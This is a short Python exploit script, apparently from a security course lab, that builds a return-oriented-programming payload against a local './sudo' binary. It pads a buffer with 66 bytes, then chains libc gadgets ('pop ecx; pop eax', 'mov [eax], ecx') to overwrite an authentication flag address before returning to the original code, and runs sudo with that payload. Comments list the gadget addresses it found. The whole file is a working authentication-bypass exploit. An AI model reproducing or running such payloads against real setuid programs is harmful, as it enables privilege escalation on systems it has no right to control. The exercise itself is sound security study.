import os, sys, struct
import assemble
from search import GadgetSearch

OFFSET = 66
LIBC_SA = 0xb7d672c0
AUTH_ADDRESS = 0x0804A054
ORIGINAL_RA = 0x080488C6
DATA = 0x11111111
PATH_TO_SUDO = './sudo'
PATH_TO_GDB = '/usr/bin/gdb'
LIBC_DUMP_PATH = './libc.bin'

def get_rop_stack(pop_address, mov_address):
	res  =	'a' * OFFSET  + struct.pack('<IIIII',pop_address, DATA, AUTH_ADDRESS, mov_address, ORIGINAL_RA)
	return res

def get_arg():
    s = GadgetSearch(LIBC_DUMP_PATH, LIBC_SA)
    pop_gadget = s.find('pop ecx; pop eax')
    mov_gadget = s.find('mov [eax], ecx')
    print('pop address: ' + str(hex(pop_gadget)) + '\nmov address: ' + str(hex(mov_gadget)))
    res = get_rop_stack(pop_gadget, mov_gadget)
    for b in res:
    	print(hex(ord(b)))
    return res

def main(argv):
	#os.execl(PATH_TO_GDB, PATH_TO_GDB, '--args', PATH_TO_SUDO, get_arg())
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
#[['mov [eax],ecx', '0xb7d925ab'], ['mov [eax],ecx', '0xb7d92843'],
# ['mov [eax],ecx', '0xb7d92b9a'], ['mov [eax],edx', '0xb7dd7eb0'],
# ['mov [eax],edx', '0xb7e866bb']]

#[['pop ecx; pop eax', '0xb7e512dc'], ['pop ecx; pop eax', '0xb7e512fd'], 
# ['pop ecx; pop edx', '0xb7d92db8']]

